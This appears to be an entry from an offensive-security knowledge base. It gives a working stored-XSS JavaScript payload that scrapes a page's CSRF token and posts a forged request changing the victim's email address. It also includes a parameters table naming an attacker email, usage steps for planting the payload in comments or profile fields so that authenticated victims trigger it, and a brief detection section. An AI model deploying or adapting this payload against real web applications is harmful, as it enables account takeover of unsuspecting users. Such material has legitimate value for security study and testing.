---
id: ee7ad8f0-858f-4565-85e7-e6edd28bce30
type: code
language: JavaScript
verified: true
created_at: '2020-08-05T15:51:59.877632+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - xss
  - csrf
  - payload
  - javascript
validated: true
---

# JavaScript-XSS-Payload-for-CSRF-Bypass

## Code

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

## Description

This JavaScript code is a stored XSS payload designed to bypass CSRF protections by dynamically fetching the valid CSRF token from the target form and including it in a forged POST request to change the user's email address. It uses XMLHttpRequest to first GET the email page, parse the token from the HTML using a regex match, and then POST the token along with the malicious email parameter. The payload executes in the victim's browser context when they view the injected content, performing the action transparently.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `/email` | URL to fetch the form containing the CSRF token | `/user/email-form` |
| `/email/change-email` | Endpoint for the state-changing POST request | `/api/change-email` |
| `name="csrf" value="(\w+)"` | Regex pattern to match the CSRF token field; adjust based on actual HTML | `name="_token" value="[a-zA-Z0-9]+"` |
| `test@test.com` | Malicious payload data (e.g., new email value) | `attacker@evil.com` |

## Usage

Inject this payload into a stored XSS vector, such as a blog comment or user profile field, on a web application vulnerable to persistent XSS. Ensure the victim is authenticated and views the content. The code assumes the token is a simple alphanumeric string; test and adjust the regex for the target's implementation. Use browser developer tools to debug execution during payload crafting.

## Detection

- Client-side: CSP violations or unusual XMLHttpRequest calls to internal endpoints; monitor for regex-based HTML parsing in scripts.
- Server-side: Log all state-changing requests and flag those with mismatched referer origins or anomalous user agents.
- Behavioral: Detect rapid email changes or account modifications without user interaction; scan user-generated content for <script> tags and XMLHttpRequest patterns.
- Tools: Use browser extensions like XSS Auditor or server-side scanners to identify injected scripts.

## Related

- [[procedures/Stored-XSS-to-Bypass-CSRF-Tokens]]
